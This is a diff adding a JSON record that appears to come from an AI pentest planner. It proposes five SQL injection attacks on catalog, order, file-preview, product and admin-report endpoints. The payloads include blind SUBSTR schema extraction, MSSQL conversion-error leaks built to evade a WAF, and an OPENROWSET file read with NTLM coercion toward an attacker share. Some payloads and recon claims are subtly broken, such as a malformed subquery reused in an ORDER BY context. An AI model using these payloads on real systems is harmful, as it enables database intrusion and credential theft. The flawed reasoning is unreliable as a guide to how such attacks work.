@@ -1,0 +1,68 @@
+{
+ "key": "sqli_6",
+ "model": "opencode/mimo-v2.6-flash-free",
+ "class": "sqli",
+ "variants": [
+  {
+   "endpoint": "GET /catalog/filter",
+   "target_param": "category",
+   "recon_evidence": "Boolean blind oracle confirmed: category=1' AND '1'='1 returns the full listing while category=1' AND '1'='2 returns an empty result set; error messages are suppressed and no data is reflected.",
+   "planner_rationale": "Char-by-char SUBSTR against information_schema, exploiting the confirmed true/false page flip to extract table names without any error output.",
+   "vuln_class": "sqli",
+   "payload": "1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables = 'A'",
+   "injection_point": "query",
+   "expected_success_signal": "TRUE/FALSE page flip per guessed character",
+   "confidence": 0.9,
+   "reasoning": "The observed true/false content differential matches the documented blind pattern, turning the listing page into a boolean oracle; iterating position and character extracts table names one letter at a time."
+  },
+  {
+   "endpoint": "GET /orders/lookup",
+   "target_param": "order_id",
+   "recon_evidence": "MSSQL backend disclosed in stack trace on malformed input; classic +AND+1=@@version-- returns a 403 from the WAF, but numeric order_id values are interpolated directly and error messages are rendered to the page.",
+   "planner_rationale": "Alternative error vector via string concatenation with a conversion function, sidestepping the blocked +AND+1=@@version-- shape.",
+   "vuln_class": "sqli",
+   "payload": "1'%2buser_name(@@version)--",
+   "injection_point": "query",
+   "expected_success_signal": "Conversion error message containing the concatenated value",
+   "confidence": 0.85,
+   "reasoning": "The MSSQL error-rendering channel plus WAF blocking of the classic concatenation shape selects the %2b string-concatenation trick: concatenating USER_NAME() with @@version forces a type-conversion error that leaks the value."
+  },
+  {
+   "endpoint": "GET /files/preview",
+   "target_param": "doc_id",
+   "recon_evidence": "MSSQL injection in doc_id with a UNION-capable error channel; service account suspected to hold admin privileges and the goal is local file read plus NTLM coercion.",
+   "planner_rationale": "OPENROWSET(BULK...) reads a local file in one expression, giving file read and coercion potential from the same vector.",
+   "vuln_class": "sqli",
+   "payload": "1+and+1=(select+x+from+OpenRowset(BULK+'C:/Windows/win.ini',SINGLE_CLOB)+R(x))--+",
+   "injection_point": "query",
+   "expected_success_signal": "win.ini contents surfaced through the error/union channel",
+   "confidence": 0.72,
+   "reasoning": "The injection channel reflects SQL errors/union results, so OPENROWSET(BULK...) reading C:/Windows/win.ini will surface file contents through that channel; the UNC-path BULK variant additionally coerces the service account's NetNTLM toward an attacker share."
+  },
+  {
+   "endpoint": "GET /api/v2/products",
+   "target_param": "sort",
+   "recon_evidence": "sort parameter is reflected into an ORDER BY clause: sort=id works, sort=id,(SELECT 1) is accepted, and sort=id-- yields a 500 indicating the trailing quote is not quoted; page flips between full and empty result sets for true/false conditions.",
+   "planner_rationale": "Confirmed boolean blind in ORDER BY context; use SUBSTR against information_schema to enumerate schema character by character.",
+   "vuln_class": "sqli",
+   "payload": "1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables = 'A'",
+   "injection_point": "query",
+   "expected_success_signal": "TRUE/FALSE page flip per guessed character",
+   "confidence": 0.88,
+   "reasoning": "The observed acceptance of a subquery in the ORDER BY position and the true/false result-set differential confirm a boolean blind oracle; SUBSTR on information_schema.tables extracts table names one character at a time."
+  },
+  {
+   "endpoint": "POST /admin/report/generate",
+   "target_param": "report_id",
+   "recon_evidence": "MSSQL backend; WAF rejects strings containing @@version and AND 1=1 in the body, but report_id is a numeric field whose conversion errors are returned verbatim in the JSON response.",
+   "planner_rationale": "Bypass the @@version/AND WAF signatures by leaking version via a conversion error built from string concatenation instead of the classic comparison.",
+   "vuln_class": "sqli",
+   "payload": "1'%2buser_name(@@version)--",
+   "injection_point": "body",
+   "expected_success_signal": "Conversion error message containing the concatenated value",
+   "confidence": 0.8,
+   "reasoning": "The numeric body parameter renders MSSQL conversion errors verbatim while the WAF blocks the classic version probe, so concatenating USER_NAME() with @@version using %2b forces a conversion error that leaks the version string."
+  }
+ ],
+ "raw_tail": "\": \"Conversion error message containing the concatenated value\",\n  \"confidence\": 0.8,\n  \"reasoning\": \"The numeric body parameter renders MSSQL conversion errors verbatim while the WAF blocks the classic version probe, so concatenating USER_NAME() with @@version using %2b forces a conversion error that leaks the version string.\",\n  \"injection_point\": \"body\"\n }\n]\n\u001b[0m\n> build · mimo-v2.6-flash-free\n"
+}
